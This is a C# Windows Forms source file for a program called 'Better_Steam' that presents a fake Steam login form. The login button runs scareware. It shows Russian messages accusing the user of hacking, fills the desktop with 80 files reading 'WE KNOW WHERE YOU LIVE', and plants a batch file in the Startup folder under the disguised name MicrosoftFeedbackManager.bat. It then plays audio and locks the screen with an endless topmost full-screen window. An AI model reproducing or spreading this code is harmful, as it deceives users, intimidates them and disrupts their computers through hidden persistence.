using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Better_Steam
{
    public partial class LoginForm : Form
    {
        public LoginForm()
        {
            InitializeComponent();
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Неверный логин или пароль!", "Ошибка авторизации", MessageBoxButtons.OKCancel, MessageBoxIcon.Stop);
            MessageBox.Show("Наша система безопасности считает что вы пытаетесь взломать чей-то аккаунт. Это было зря...", "Ошибка авторизации", MessageBoxButtons.OK, MessageBoxIcon.Error);

            String startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            String workspacePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            
            FileInfo startup = new FileInfo("config.bat");
            short i = new short();
            File.WriteAllText("properties.txt", "МЫ ЗНАЕМ ГДЕ ТЫ ЖИВЁШЬ");
            FileInfo spam = new FileInfo("properties.txt");

            for (i=1; i<=80; i++)
            {
                spam.CopyTo(workspacePath + "\\DON'T OPEN THE DOOR_"+i+".txt");
            }
            startup.CopyTo(startupFolderPath+"\\MicrosoftFeedbackManager.bat");
            //System.Diagnostics.Process.Start("config.bat");
            System.Media.SoundPlayer player = new System.Media.SoundPlayer("audio1.wav");
            player.Play();
            Form2 whitescreen = new Form2();
            whitescreen.Show();
            whitescreen.WindowState = FormWindowState.Maximized;
            for(i=1; i<=100; i = 1)
            {
                this.TopMost = true;
            }
        }
    }
}
